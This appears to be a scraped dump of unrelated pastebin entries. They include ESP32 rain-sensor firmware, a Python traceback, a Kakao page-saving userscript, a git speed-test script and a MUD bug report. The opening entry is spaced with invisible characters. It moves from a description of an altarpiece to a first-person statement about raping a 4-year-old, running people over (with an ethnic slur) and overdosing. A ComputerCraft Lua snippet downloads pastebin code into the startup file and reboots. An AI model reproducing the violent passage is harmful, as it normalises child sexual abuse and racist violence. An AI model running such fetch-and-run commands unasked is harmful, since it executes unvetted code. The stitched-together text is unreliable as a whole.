‎r‎e‎s‎t‎o‎r‎a‎t‎i‎o‎n‎ ‎w‎a‎s‎ ‎u‎n‎d‎e‎r‎t‎a‎k‎e‎n‎ ‎i‎n‎ ‎t‎h‎e‎ ‎1‎9‎t‎h‎ ‎c‎e‎n‎t‎u‎r‎y‎ ‎u‎n‎d‎e‎r‎ ‎t‎h‎e‎ ‎d‎i‎r‎e‎c‎t‎i‎o‎n‎ ‎o‎f‎ ‎A‎d‎a‎l‎b‎e‎r‎t‎ ‎S‎t‎i‎f‎t‎e‎r‎.‎ ‎T‎h‎e‎ ‎a‎l‎t‎a‎r‎p‎i‎e‎c‎e‎ ‎h‎a‎s‎ ‎b‎e‎e‎n‎ ‎d‎e‎s‎c‎r‎i‎b‎e‎d‎ ‎a‎s‎ ‎""‎o‎n‎e‎ ‎o‎f‎ ‎t‎h‎e‎ ‎g‎r‎e‎a‎t‎e‎s‎t‎ ‎a‎c‎h‎i‎e‎v‎e‎m‎e‎n‎t‎s‎ ‎i‎n‎ ‎l‎a‎t‎e‎-‎m‎e‎d‎i‎e‎v‎a‎l‎ ‎s‎c‎u‎l‎p‎t‎u‎r‎e‎ ‎i‎n‎ ‎t‎h‎e‎ ‎G‎e‎r‎m‎a‎n‎-‎s‎p‎e‎a‎k‎i‎n‎g‎ ‎a‎r‎e‎a‎""‎.‎ ‎T‎h‎i‎s‎ ‎i‎m‎a‎g‎e‎ ‎s‎h‎o‎w‎s‎ ‎t‎h‎e‎ ‎u‎p‎p‎e‎r‎-‎r‎i‎g‎h‎t‎ ‎w‎i‎n‎g‎ ‎p‎a‎n‎e‎l‎ ‎o‎f‎ ‎t‎h‎e‎ ‎K‎e‎f‎e‎r‎m‎a‎r‎k‎t‎ ‎a‎l‎t‎a‎r‎p‎i‎e‎c‎e‎,‎ ‎d‎e‎p‎i‎c‎t‎i‎n‎g‎ ‎t‎h‎e‎ ‎A‎n‎n‎u‎n‎c‎i‎a‎t‎i‎o‎n‎.‎ ‎M‎a‎r‎y‎ ‎i‎s‎ ‎p‎o‎r‎t‎r‎a‎y‎e‎d‎ ‎k‎n‎e‎e‎l‎i‎n‎g‎ ‎i‎n‎ ‎a‎ ‎p‎r‎a‎y‎i‎n‎g‎ ‎s‎t‎o‎o‎l‎ ‎i‎n‎s‎i‎d‎e‎ ‎a‎ ‎h‎a‎l‎f‎-‎o‎p‎e‎n‎ ‎s‎t‎r‎u‎c‎t‎u‎r‎e‎,‎ ‎s‎u‎p‎p‎o‎r‎t‎e‎d‎ ‎b‎y‎ ‎u‎n‎u‎s‎u‎a‎l‎l‎y‎ ‎c‎a‎r‎v‎e‎d‎ ‎p‎i‎l‎l‎a‎r‎s‎,‎ ‎c‎r‎o‎w‎n‎e‎d‎ ‎a‎b‎o‎v‎e‎ ‎t‎h‎e‎i‎r‎ ‎c‎a‎p‎i‎t‎a‎l‎s‎ ‎w‎i‎t‎h‎ ‎f‎i‎g‎u‎r‎e‎s‎ ‎w‎h‎i‎c‎h‎ ‎a‎r‎e‎ ‎p‎r‎o‎b‎a‎b‎l‎y‎ ‎i‎n‎t‎e‎n‎d‎e‎d‎ ‎t‎o‎ ‎b‎e‎ ‎p‎r‎o‎p‎h‎e‎t‎s‎ ‎f‎r‎o‎m‎ ‎t‎h‎e‎ ‎O‎l‎d‎ ‎T‎e‎s‎t‎a‎m‎e‎n‎t‎.‎ ‎T‎h‎e‎ ‎a‎r‎c‎h‎a‎n‎g‎e‎l‎ ‎G‎a‎b‎r‎i‎e‎l‎ ‎i‎s‎ ‎e‎n‎t‎e‎r‎i‎n‎g‎ ‎t‎h‎e‎ ‎s‎t‎r‎u‎c‎t‎u‎r‎e‎,‎ ‎a‎n‎d‎ ‎h‎o‎l‎d‎s‎ ‎a‎ ‎s‎p‎e‎e‎c‎h‎ ‎s‎c‎r‎o‎l‎l‎ ‎w‎h‎e‎r‎e‎ ‎p‎a‎r‎t‎s‎ ‎o‎f‎ ‎h‎i‎s‎ ‎g‎r‎e‎e‎t‎i‎n‎g‎,‎ ‎t‎h‎e‎ ‎A‎v‎e‎ ‎M‎a‎r‎i‎a‎,‎ ‎i‎s‎ ‎v‎i‎s‎i‎b‎l‎e‎.‎ ‎I‎n‎ ‎t‎h‎e‎ ‎u‎p‎p‎e‎r‎-‎l‎e‎f‎t‎ ‎c‎o‎r‎n‎e‎r‎ ‎i‎s‎ ‎a‎ ‎d‎e‎p‎i‎c‎t‎i‎o‎n‎ ‎o‎f‎ ‎G‎o‎d‎ ‎t‎h‎e‎ ‎F‎a‎t‎h‎e‎r‎ ‎a‎m‎o‎n‎g‎ ‎c‎l‎o‎u‎d‎s‎ ‎a‎n‎d‎ ‎f‎l‎a‎n‎k‎e‎d‎ ‎b‎y‎ ‎t‎w‎o‎ ‎a‎n‎g‎e‎l‎s‎.‎ ‎T‎h‎e‎ ‎p‎a‎n‎e‎l‎ ‎o‎r‎i‎g‎i‎n‎a‎l‎l‎y‎ ‎a‎l‎s‎o‎ ‎c‎o‎n‎t‎a‎i‎n‎e‎d‎ ‎a‎ ‎d‎o‎v‎e‎,‎ ‎t‎h‎e‎ ‎s‎y‎m‎b‎o‎l‎ ‎o‎f‎ ‎t‎h‎e‎ ‎H‎o‎l‎y‎ ‎S‎p‎i‎r‎i‎t‎,‎ ‎b‎u‎t‎ ‎i‎t‎ ‎h‎a‎s‎ ‎b‎e‎e‎n‎ ‎l‎o‎s‎t‎.‎

S‎c‎u‎l‎p‎t‎u‎r‎e‎ ‎c‎r‎e‎d‎i‎t‎:‎ ‎M‎a‎s‎t‎e‎r‎ ‎o‎f‎ ‎t‎h‎e‎ ‎K‎e‎f‎e‎r‎m‎a‎r‎k‎t‎ ‎A‎l‎t‎a‎r‎p‎i‎e‎c‎e‎;‎ ‎p‎h‎o‎t‎o‎g‎r‎a‎p‎h‎e‎d‎ ‎b‎y‎ ‎U‎o‎a‎e‎i‎1‎

.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎.‎

W‎e‎l‎l‎.‎ ‎I‎'‎m‎ ‎d‎o‎n‎e‎ ‎w‎i‎t‎h‎ ‎t‎h‎e‎ ‎n‎e‎w‎s‎.‎ ‎I‎ ‎d‎o‎n‎'‎t‎ ‎k‎n‎o‎w‎ ‎h‎o‎w‎ ‎I‎ ‎d‎i‎d‎ ‎i‎t‎,‎ ‎b‎u‎t‎ ‎I‎ ‎m‎a‎g‎i‎c‎a‎l‎l‎y‎ ‎f‎i‎n‎i‎s‎h‎e‎d‎ ‎t‎h‎e‎ ‎n‎e‎w‎s‎.‎ ‎N‎o‎w‎ ‎I‎'‎m‎ ‎g‎o‎i‎n‎g‎ ‎t‎o‎ ‎m‎a‎g‎i‎c‎a‎l‎l‎y‎ ‎r‎a‎p‎e‎ ‎a‎ ‎4‎ ‎y‎e‎a‎r‎ ‎o‎l‎d‎ ‎g‎i‎r‎l‎,‎ ‎a‎n‎d‎ ‎t‎h‎e‎n‎ ‎m‎a‎g‎i‎c‎a‎l‎l‎y‎ ‎r‎u‎n‎ ‎o‎v‎e‎r‎ ‎s‎o‎m‎e‎ ‎s‎p‎i‎c‎s‎ ‎w‎i‎t‎h‎ ‎m‎y‎ ‎c‎a‎r‎,‎ ‎a‎n‎d‎ ‎t‎h‎e‎n‎ ‎m‎a‎g‎i‎c‎a‎l‎l‎y‎ ‎d‎o‎w‎n‎ ‎a‎ ‎w‎h‎o‎l‎e‎ ‎b‎o‎t‎t‎l‎e‎ ‎o‎f‎ ‎L‎o‎r‎a‎z‎e‎p‎a‎m‎.‎"
jYfrdJt2,ESP32 ADXL345 RAIN SENSOR,kodilivetv,C++,Tuesday 25th of March 2025 05:58:01 PM CDT,"/*
  This sketch configures an ESP32 module to monitor motion using an ADXL345 accelerometer, 
  sends boot count information via Telegram, and manages power consumption through deep sleep modes.

  Key functionalities:
  - Monitors activity on the Y-axis using the ADXL345 accelerometer, with configurable thresholds.
  - Connects to WiFi and sends updates via Telegram on each boot, including the boot count.
  - If no significant activity is detected within a few seconds after ADXL345 setup begins, the ESP32 enters deep sleep mode.
  - Deep sleep is managed based on the boot count:
    - Boots 1-2: The ESP32 can wake up on external activity (GPIO14).
    - Boot 3: The ESP32 sleeps for an extended period (2 minutes), then resets the boot count.
  - Includes brownout protection and visual feedback (LED) on boot and before entering deep sleep.

  Libraries used:
  - ADXL345_WE: For controlling and configuring the ADXL345 accelerometer.
      https://wolles-elektronikkiste.de/en/adxl345-the-universal-accelerometer-part-1 (English)
      https://github.com/wollewald/ADXL345_WE
  - AsyncTelegram2: For sending messages through Telegram.
      https://github.com/cotestatnt/AsyncTelegram2
  
  Configure WiFi and Telegram token parameters.

  This project is being used to detect rain events. The bottom of a plastic container was cut and the opening, now facing up, covered with cellophane;
  the adxl345 was glued to the cellophane, which bounces with the drops of rain, triggering the interrupt.
*/

#include ""driver/rtc_io.h""

#include<Wire.h>
#include<ADXL345_WE.h>
#define ADXL345_I2CADDR 0x53 // 0x1D if SDO = HIGH
const int int2Pin = 14;
volatile bool in_activity = false; // in_activity: either activity or inactivity interrupt occured

#include ""soc/soc.h""           // Brownout error fix
#include ""soc/rtc_cntl_reg.h""  // Brownout error fix

#include <WiFiClientSecure.h>
WiFiClientSecure client;

#include <AsyncTelegram2.h> // https://github.com/cotestatnt/AsyncTelegram2
AsyncTelegram2 myBot(client);
const char * network = ""696969""; // SSID WiFi network
const char * pass = ""696969""; // Password  WiFi network
const char * token = ""696969""; // () Telegram token
int64_t userid = 696969;
//int64_t userid = -696969; // 
#define MYTZ ""WET0WEST,M3.5.0/1,M10.5.0/2"" // POSIX timezone string for Lisbon

/* There are several ways to create your ADXL345 object:
 * ADXL345_WE myAcc = ADXL345_WE()                -> uses Wire / I2C Address = 0x53
 * ADXL345_WE myAcc = ADXL345_WE(ADXL345_I2CADDR) -> uses Wire / ADXL345_I2CADDR
 * ADXL345_WE myAcc = ADXL345_WE(&wire2)          -> uses the TwoWire object wire2 / ADXL345_I2CADDR
 * ADXL345_WE myAcc = ADXL345_WE(&wire2, ADXL345_I2CADDR) -> all together
 */
ADXL345_WE myAcc = ADXL345_WE(ADXL345_I2CADDR);

int activity_counter = 0;
bool goToSleep = false;

#define uS_TO_S_FACTOR 1000000ULL /* Conversion factor for micro seconds to seconds */
#define LONG_SLEEP_TIME 10 * 60 /* Time ESP32 will sleep (in seconds) if bootCount = 4 */
#define WAKEUP_GPIO GPIO_NUM_14 /* GPIO pin used for external wakeup */

RTC_DATA_ATTR int bootCount = 0;

byte ledPin = 13; // ESP32-room-32

portMUX_TYPE mux = portMUX_INITIALIZER_UNLOCKED;

void IRAM_ATTR in_activityISR() {
  
  portENTER_CRITICAL(&mux);
  in_activity = true;
  portEXIT_CRITICAL(&mux);
  
}

void sendToTelegram() {

  Serial.print(""Connecting to "");
  Serial.println(network);

  WiFi.begin(network, pass);

  int wifi_start_counter = 0;
  while (WiFi.status() != WL_CONNECTED) {
    Serial.print(""."");
    wifi_start_counter++;
    if (wifi_start_counter >= 10) {
      //enterDeepSleep();
      break;
    }
    delay(1000);
  }

  Serial.println("""");
  Serial.println(""WiFi connected!"");

  // Sync time with NTP
  configTzTime(MYTZ, ""time.google.com"", ""time.windows.com"", ""pool.ntp.org"");
  client.setCACert(telegram_cert);
  // Set the Telegram bot properies
  myBot.setUpdateTime(2000);
  myBot.setTelegramToken(token);

  // Check if all things are ok
  Serial.print(""\nTest Telegram connection... "");
  myBot.begin() ? Serial.println(""OK"") : Serial.println(""NOK"");

  // Send a welcome message to user when ready
  //  char welcome_msg[64];
  //  snprintf(welcome_msg, 64, ""BOT @%s online.\nTry with /takePhoto command."", myBot.getBotName());
  //  myBot.sendTo(userid, welcome_msg);

  char bootCountMsg[64];
  snprintf(bootCountMsg, 64, ""Boot count is: %d"", bootCount);
  myBot.sendTo(userid, bootCountMsg);

  //  const char* message = ""/clip"";
  //  // Send the message to the Telegram channel
  //  bool sent = myBot.sendTo(userid, message);
  
}

void blinkLED(int numBlinks, int blinkInterval) {
  for (int i = 0; i < numBlinks; i++) {
    digitalWrite(ledPin, HIGH); // Turn on the LED
    delay(blinkInterval);
    digitalWrite(ledPin, LOW); // Turn off the LED
    delay(blinkInterval);
  }
}

void setup() {
  WRITE_PERI_REG(RTC_CNTL_BROWN_OUT_REG, 0); // disable brownout detector
  
  Wire.begin(33, 32);
  Serial.begin(9600); Serial.println();
  pinMode(int2Pin, INPUT);
  pinMode(ledPin, OUTPUT);

  blinkLED(3, 200); // Blink the LED 3 times with a 200ms interval to indicate wake up

  Serial.println(""ADXL345_Sketch - Activity and Inactivity Interrupts"");
  Serial.println();
  
    //Increment boot number and print it every reboot
  ++bootCount;
  Serial.println(""Boot number: "" + String(bootCount));
  Serial.println();
  
  sendToTelegram();
   
  if (!myAcc.init()) {
    Serial.println(""ADXL345 not connected!"");
  }

/* Choose the data rate         Hz
    ADXL345_DATA_RATE_3200    3200
    ADXL345_DATA_RATE_1600    1600
    ADXL345_DATA_RATE_800      800
    ADXL345_DATA_RATE_400      400
    ADXL345_DATA_RATE_200      200
    ADXL345_DATA_RATE_100      100
    ADXL345_DATA_RATE_50        50
    ADXL345_DATA_RATE_25        25
    ADXL345_DATA_RATE_12_5      12.5  
    ADXL345_DATA_RATE_6_25       6.25
    ADXL345_DATA_RATE_3_13       3.13
    ADXL345_DATA_RATE_1_56       1.56
    ADXL345_DATA_RATE_0_78       0.78
    ADXL345_DATA_RATE_0_39       0.39
    ADXL345_DATA_RATE_0_20       0.20
    ADXL345_DATA_RATE_0_10       0.10
*/
  myAcc.setDataRate(ADXL345_DATA_RATE_200);
  Serial.print(""Data rate: "");
  Serial.print(myAcc.getDataRateAsString());

/* Choose the measurement range
    ADXL345_RANGE_16G    16g     
    ADXL345_RANGE_8G      8g     
    ADXL345_RANGE_4G      4g   
    ADXL345_RANGE_2G      2g
*/
  myAcc.setRange(ADXL345_RANGE_2G);
  Serial.print(""  /  g-Range: "");
  Serial.println(myAcc.getRangeAsString());
  Serial.println();

  attachInterrupt(digitalPinToInterrupt(int2Pin), in_activityISR, RISING);

/* Three parameters have to be set for activity:
    1. DC / AC Mode:
        ADXL345_DC_MODE - Threshold is the defined one (parameter 3)
        ADXL345_AC_MODE - Threshold = starting acceleration + defined threshold
    2. Axes, that are considered:
        ADXL345_000  -  no axis (which makes no sense)
        ADXL345_00Z  -  z 
        ADXL345_0Y0  -  y
        ADXL345_0YZ  -  y,z
        ADXL345_X00  -  x
        ADXL345_X0Z  -  x,z
        ADXL345_XY0  -  x,y
        ADXL345_XYZ  -  all axes
    3. Threshold in g
*/
  myAcc.setActivityParameters(ADXL345_AC_MODE, ADXL345_0Y0, 0.1);
  
/* You can choose the following interrupts:
    Variable name:           Triggered, if:
    ADXL345_OVERRUN      -   new data replaces unread data
    ADXL345_WATERMARK    -   the number of samples in FIFO equals the number defined in FIFO_CTL
    ADXL345_FREEFALL     -   acceleration values of all axes are below the threshold defined in THRESH_FF 
    ADXL345_INACTIVITY   -   acc. value of all included axes are < THRESH_INACT for period > TIME_INACT
    ADXL345_ACTIVITY     -   acc. value of included axes are > THRESH_ACT
    ADXL345_DOUBLE_TAP   -   double tap detected on one incl. axis and various defined conditions are met
    ADXL345_SINGLE_TAP   -   single tap detected on one incl. axis and various defined conditions are met
    ADXL345_DATA_READY   -   new data available

    Assign the interrupts to INT1 (INT_PIN_1) or INT2 (INT_PIN_2). Data ready, watermark and overrun are 
    always enabled. You can only change the assignment of these which is INT1 by default.

    You can delete interrupts with deleteInterrupt(type);
*/
  myAcc.setInterrupt(ADXL345_ACTIVITY, INT_PIN_2);
  myAcc.readAndClearInterrupts();  
}

/* In the main loop some checks are done:
    getActTapStatus() returns which axes are responsible for activity interrupt as byte (code in library)
    getActTapStatusAsString() returns the axes that caused the interrupt as string
    readAndClearInterrupts(); returns the interrupt type as byte (code in library) 
    checkInterrupt(intSource, type) returns if intSource is type as bool
*/

void loop() {
  if ((millis() % 1000) == 1) {
    xyzFloat g = myAcc.getGValues();
    Serial.print(""g-x   = "");
    Serial.print(g.x);
    Serial.print(""  |  g-y   = "");
    Serial.print(g.y);
    Serial.print(""  |  g-z   = "");
    Serial.print(g.z);
    Serial.print(""  |  act-cnt   = "");
    ++activity_counter;
    Serial.println(activity_counter);
  }

  if(in_activity == true) {
      ++activity_counter;
      //byte actTapSource = myAcc.getActTapStatus();
      //Serial.println(actTapSource, BIN);
      String axes = myAcc.getActTapStatusAsString();
      byte intSource = myAcc.readAndClearInterrupts();
      
      if(myAcc.checkInterrupt(intSource, ADXL345_ACTIVITY)){
        Serial.print(""Activity at: "");
        Serial.println(axes);
      }
      
    delay(1000);
    myAcc.readAndClearInterrupts();
    in_activity = false;
  }
  
  if(activity_counter >= 20) goToSleep = true;
  
  if(goToSleep == true) {
    Serial.println(""goToSleep == true"");
    Serial.println();

    if (bootCount >= 1 && bootCount <= 2) {

      // Configure external wakeup on GPIO14
      esp_sleep_enable_ext0_wakeup(WAKEUP_GPIO, 1); // 1 = High, 0 = Low
      rtc_gpio_pullup_dis(WAKEUP_GPIO);
      rtc_gpio_pulldown_en(WAKEUP_GPIO);
      Serial.println(""Setup ESP32 to wake up on GPIO14 trigger"");
  
    } else if (bootCount == 3) {
  
      // Sleep for 10 minutes instead of sending more than 3 consecutive notifications
      bootCount = 0;
      esp_sleep_enable_timer_wakeup(LONG_SLEEP_TIME * uS_TO_S_FACTOR);
      Serial.println(""Setup ESP32 to sleep for 10 * 60 seconds and reset bootCount"");
  
    }
  
    // Go to sleep now
    blinkLED(2, 1000); // Blink the LED 3 times with a 200ms interval to indicate wake up
    Serial.println(""Going to sleep now"");
    Serial.flush();
    esp_deep_sleep_start();
    Serial.println(""This will never be printed"");
    Serial.println();
  }
  
}
"
Bf3Tg4wU,Untitled,ElijahCrafter,Lua,Tuesday 25th of March 2025 05:54:58 PM CDT,"shell.run(""pastebin get 0hUKaXKe mine"")
shell.run(""delete startup"")
shell.run(""pastebin get KwKgzdLv startup"")
shell.run(""reboot"")


"
RKKjtKdv,AttributeError: 'NoneType' object has no attribute 'name',basedcount_bot,Python,Tuesday 25th of March 2025 05:35:55 PM CDT,"Traceback (most recent call last):
  File ""/home/gmktec/Programming/Bots/basedcount_bot/basedcount_bot.py"", line 46, in wrapper
    await func(reddit_instance, mongo_client)
  File ""/home/gmktec/Programming/Bots/basedcount_bot/basedcount_bot.py"", line 275, in read_comments
    parent_info = await get_parent_info(comment)
                  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File ""/home/gmktec/Programming/Bots/basedcount_bot/basedcount_bot.py"", line 237, in get_parent_info
    parent_author = parent_post.author.name
                    ^^^^^^^^^^^^^^^^^^^^^^^
AttributeError: 'NoneType' object has no attribute 'name'
"
xe3DYpZL,kakao_saver.js,Shuraken007,JavaScript,Tuesday 25th of March 2025 05:13:27 PM CDT,"// ==UserScript==
// @name         Kakao Saver
// @namespace    http://tampermonkey.net/
// @version      2025-03-25
// @description  try to take over the world!
// @author       Shuraken
// @match        https://page.kakao.com/content/*/viewer/*
// @icon         https://www.google.com/s2/favicons?sz=64&domain=kakao.com
// @grant        none
// ==/UserScript==

(function() {
    'use strict';

    async function delay(ms) {
        return new Promise(resolve => setTimeout(resolve, ms))
    }

    function get_paragraphs() {
        let root = [...document.querySelectorAll('div')].filter(x => x.shadowRoot)
        if (root.length === 0) return null
        let paragraphs = [...root[0].shadowRoot.firstChild.getElementsByTagName('p')]
        if (paragraphs.length === 0) return null
        return paragraphs
    }

    function get_book_chapter() {
      let path_arr = window.location.href.split('/')
      let chapter = path_arr.pop()
      path_arr.pop()
      let book = path_arr.pop()
      return [book, chapter]
    }

    function save_paragraphs(paragraphs) {
        let [book, chapter] = get_book_chapter()
        let storage = localStorage.getItem(`kakao_saver_${book}`) || '{}'
        storage = JSON.parse(storage)
        storage[chapter] = paragraphs.map(x => x.textContent).join('\n')
        localStorage.setItem(`kakao_saver_${book}`, JSON.stringify(storage))
        console.log(`saved ${paragraphs.length} paragraphs for ${chapter} chapter`)
    }

    function kk_print() {
        let [book, _] = get_book_chapter()
        let storage = localStorage.getItem(`kakao_saver_${book}`) || '{}'
        storage = JSON.parse(storage)
        let sorted_pairs = Object.entries(storage).sort(([, a], [, b]) => Number(b) - Number(a))
        if (sorted_pairs.length === 0) {
           console.log(""nothing to print, no chapters"")
           return
        }
        let chapters = []
        for (let [_, val] of sorted_pairs)
            chapters.push(val)
        console.log(chapters.join(""\n\n""))
        console.log(`printed ${chapters.length} chapters`)
        console.log(`first started with ${chapters[0].substring(0, 10)}`)
        console.log(`last ended with ${chapters[chapters.length - 1].slice(-10, -1)}`)
    }
    window.kk_print = kk_print

    async function run() {
       let paragraphs;
       while(!paragraphs) {
            paragraphs = get_paragraphs()
           await delay(200)
       }
       save_paragraphs(paragraphs)
    }

    run()

    window.navigation.addEventListener(""navigate"", () => run())
})();"
sFsFcDu3,Git_network_test,JimMcKeeth,Python,Tuesday 25th of March 2025 05:01:57 PM CDT,"import speedtest
import git
from git.remote import RemoteProgress 
import os
import datetime
import time
import shutil
from pathlib import Path
import traceback  
import csv 

def run_speed_test(max_retries=3, retry_delay=5):
    last_error = None
    for attempt in range(max_retries):
        try:
            st = speedtest.Speedtest(secure=True)  # Force HTTPS
            st.get_servers()  # Get list of servers
            st.get_best_server()  # Get best server
            
            # Run tests
            download_speed = st.download() / 1_000_000  # Convert to Mbps
            upload_speed = st.upload() / 1_000_000  # Convert to Mbps
            ping = st.results.ping
            return download_speed, upload_speed, ping
            
        except Exception as e:
            last_error = str(e)
            if ""403"" in str(e):
                print(f""Attempt {attempt + 1}/{max_retries}: Speedtest.net rate limit or authentication error"")
            else:
                print(f""Attempt {attempt + 1}/{max_retries}: Speed test failed - {str(e)}"")
            
            if attempt < max_retries - 1:
                time.sleep(retry_delay * (attempt + 1))  # Exponential backoff
    
    raise Exception(f""Speed test failed after {max_retries} attempts. Last error: {last_error}"")

def clone_repository(repo_url, target_dir, file_handle):
    try:
        log_message(f""Creating directory {target_dir}"", file_handle)
        os.makedirs(target_dir)
        
        # Create progress printer for Git operations
        stage_times = {}
        stage_start = None
        current_stage = None
        last_line_length = 0
        
        def progress_printer(op_code, cur_count, max_count=None, message=''):
            nonlocal stage_start, current_stage, last_line_length
            
            # Determine the current stage
            new_stage = []
            if op_code & RemoteProgress.COUNTING:
                new_stage.append(""Counting"")
            if op_code & RemoteProgress.COMPRESSING:
                new_stage.append(""Compressing"")
            if op_code & RemoteProgress.WRITING:
                new_stage.append(""Writing"")
            if op_code & RemoteProgress.RECEIVING:
                new_stage.append(""Receiving"")
            if op_code & RemoteProgress.RESOLVING:
                new_stage.append(""Resolving"")
            if op_code & RemoteProgress.FINDING_SOURCES:
                new_stage.append(""Finding sources"")
            
            new_stage = "" & "".join(new_stage) if new_stage else f""Stage {op_code}""
            
            # If stage changed, record timing and log the new stage
            if new_stage != current_stage:
                if stage_start and current_stage:
                    duration = time.time() - stage_start
                    if current_stage in stage_times:
                        stage_times[current_stage] += duration
                    else:
                        stage_times[current_stage] = duration
                    # Clear the last progress line and log the completed stage
                    print(' ' * last_line_length + '\r', end='')
                    log_message(f""Completed {current_stage}"", file_handle)
                current_stage = new_stage
                stage_start = time.time()
                print(f""\nStarting {current_stage}..."")
            
            # Update progress percentage on same line
            if max_count:
                progress = f""{current_stage}: {cur_count}/{max_count} ({cur_count/max_count*100:.1f}%)\r""
                print(progress, end='')
                last_line_length = len(progress)
        
        # Clone with timing information
        log_message(""Starting Git clone operation..."", file_handle)
        clone_start = time.time()
        repo = git.Repo.clone_from(repo_url, target_dir, progress=progress_printer)
        print()  # Add newline after progress display
        
        # Record final stage timing
        if stage_start and current_stage:
            duration = time.time() - stage_start
            if current_stage in stage_times:
                stage_times[current_stage] += duration
            else:
                stage_times[current_stage] = duration
        
        # Log timing summary
        total_time = time.time() - clone_start
        log_message(""\nGit clone timing summary:"", file_handle)
        for stage, duration in stage_times.items():
            log_message(f""{stage}: {duration:.2f} seconds"", file_handle)
        log_message(f""Total clone time: {total_time:.2f} seconds"", file_handle)
        
        return True, ""Repository cloned successfully"", repo
    except Exception as e:
        log_message(f""Clone error details:\n{traceback.format_exc()}"", file_handle)
        return False, str(e), None

def log_message(message, file_handle):
    print(message)
    file_handle.write(message + ""\n"")
    file_handle.flush()

def do_speed_test(f):
    # Speed test
    log_message(""Running speed test..."", f)
    try:
        download, upload, ping = run_speed_test()
        log_message(f""Download Speed: {download:.2f} Mbps"", f)
        log_message(f""Upload Speed: {upload:.2f} Mbps"", f)
        log_message(f""Ping: {ping:.2f} ms"", f)
    except Exception as e:
        log_message(f""Speed test failed: {str(e)}"", f)
    
    log_message(""\n"" + ""-"" * 50, f)
    log_message("""", f)

def cleanup_directory(directory, repo, file_handle):
    max_attempts = 4
    delay = 2

    for attempt in range(max_attempts):
        try:
            if os.path.exists(directory):
                # Clean up Git repository resources
                if repo is not None:
                    try:
                        for submodule in repo.submodules:
                            submodule.remove()
                        repo.git.clear_cache()
                        repo.close()
                    except Exception as git_error:
                        log_message(f""Git cleanup warning: {str(git_error)}\n{traceback.format_exc()}"", file_handle)
                
                time.sleep(delay * attempt)
                
                try:
                    # Try removing files first
                    for root, dirs, files in os.walk(directory, topdown=False):
                        for name in files:
                            file_path = os.path.join(root, name)
                            try:
                                os.chmod(file_path, 0o777)  # Ensure we have permission
                                os.unlink(file_path)
                            except Exception as e:
                                log_message(f""Failed to remove file {file_path}: {str(e)}"", file_handle)
                
                    # Then try rmtree
                    shutil.rmtree(directory, ignore_errors=False)  # Changed to False to get error details
                    
                    if not os.path.exists(directory):
                        log_message(f""Successfully removed directory at {directory}"", file_handle)
                        return True
                except Exception as remove_error:
                    log_message(f""Detailed removal error: {str(remove_error)}\n{traceback.format_exc()}"", file_handle)
            else:
                return True
        except Exception as e:
            log_message(f""Cleanup attempt {attempt + 1} failed: {str(e)}\n{traceback.format_exc()}"", file_handle)
            time.sleep(delay)
    
    return False

def write_metrics_to_csv(metrics):
    csv_file = ""network_tests.csv""
    file_exists = os.path.exists(csv_file)
    
    with open(csv_file, 'a', newline='') as f:
        writer = csv.writer(f)
        if not file_exists:
            writer.writerow([
                'Start Time', 'Log File', 
                'Initial Ping (ms)', 'Initial Download (Mbps)', 'Initial Upload (Mbps)',
                'Git Clone Status', 'Git Execution Time (s)',
                'Final Ping (ms)', 'Final Download (Mbps)', 'Final Upload (Mbps)'
            ])
        writer.writerow(metrics)

def main(repo_url):
    # Setup logging
    start_time = datetime.datetime.now()
    timestamp = start_time.strftime(""%Y%m%d_%H%M%S"")
    log_file = f""network_test_{timestamp}.log""
    
    # Initialize metrics
    initial_ping = initial_download = initial_upload = 0
    final_ping = final_download = final_upload = 0
    git_success = False
    git_execution_time = 0
    
    with open(log_file, ""w"") as f:
        log_message(f""Git Network Test - {start_time}"", f)
        log_message(""-"" * 50, f)
        log_message("""", f)
        
        # Initial speed test with retry
        log_message(""Running initial speed test..."", f)
        try:
            initial_download, initial_upload, initial_ping = run_speed_test()
            log_message(f""Download Speed: {initial_download:.2f} Mbps"", f)
            log_message(f""Upload Speed: {initial_upload:.2f} Mbps"", f)
            log_message(f""Ping: {initial_ping:.2f} ms"", f)
        except Exception as e:
            log_message(f""Speed test failed: {str(e)}"", f)
        
        log_message(""\n"" + ""-"" * 50 + ""\n"", f)

        # Git clone test
        git_start_time = time.time()
        target_dir = f""test_clone_{timestamp}""
        
        log_message(f""Attempting to clone repository: {repo_url}"", f)
        success, message, repo = clone_repository(repo_url, target_dir, f)
        log_message(f""Clone result: {message}"", f)
        log_message(f""Clone success: {success}"", f)
        
        git_success = success
        git_execution_time = time.time() - git_start_time
        log_message(f""\nTotal execution time: {git_execution_time:.2f} seconds"", f)

        # Cleanup after successful clone
        log_message(f""Attempting to remove cloned directory at {target_dir}"", f)
        if not cleanup_directory(target_dir, repo if success else None, f):
            log_message(f""WARNING: Failed to remove directory {target_dir}"", f)

        log_message(""\n"" + ""-"" * 50 + ""\n"", f)
        
        # Final speed test with retry
        log_message(""Running final speed test..."", f)
        try:
            final_download, final_upload, final_ping = run_speed_test()
            log_message(f""Download Speed: {final_download:.2f} Mbps"", f)
            log_message(f""Upload Speed: {final_upload:.2f} Mbps"", f)
            log_message(f""Ping: {final_ping:.2f} ms"", f)
        except Exception as e:
            log_message(f""Speed test failed: {str(e)}"", f)
        
        log_message(""\n"" + ""-"" * 50 + ""\n"", f)

    # Write metrics to CSV
    metrics = [
        start_time.isoformat(),
        log_file,
        f""{initial_ping:.2f}"",
        f""{initial_download:.2f}"",
        f""{initial_upload:.2f}"",
        ""Success"" if git_success else ""Fail"",
        f""{git_execution_time:.2f}"",
        f""{final_ping:.2f}"",
        f""{final_download:.2f}"",
        f""{final_upload:.2f}""
    ]
    write_metrics_to_csv(metrics)

if __name__ == ""__main__"":
    main(""https://github.com/skia4delphi/skia4delphi.git"")
"
cPCU0w6r,all rooms past 61518 are gone,cnl_cnl_cnl,Lua,Tuesday 25th of March 2025 04:38:55 PM CDT,"all my rooms passed 61518 no longer exist.

I have multiple logs showing these rooms existed and i sent savearea command afterwards with it showing the zone save messages.

I don't have permissions to delete rooms so it wasn't me doing it accidentally

I haven't truly lost anything because of how I have stuff written outside sloth but it indicates something is going wrong

I assume we haven't been reverting to some much older ""areas"" file 
I know Doug was adding some rooms on to old thalos - perhaps we still have some kind of running out rooms related bug ?

ie. in my mudlet logs from 2025-02-24:

Log line 11499: 
Room 61522: The Warden's Office
   The office is well-appointed with dark wooden paneling lining the walls
and ceiling and an understated carpet of traditional dwarven designs.  Tall
bookshelves cover one wall, laden with neatly organized volumes of law and
prison regulations.  An intricately carved desk of jungle hardwood
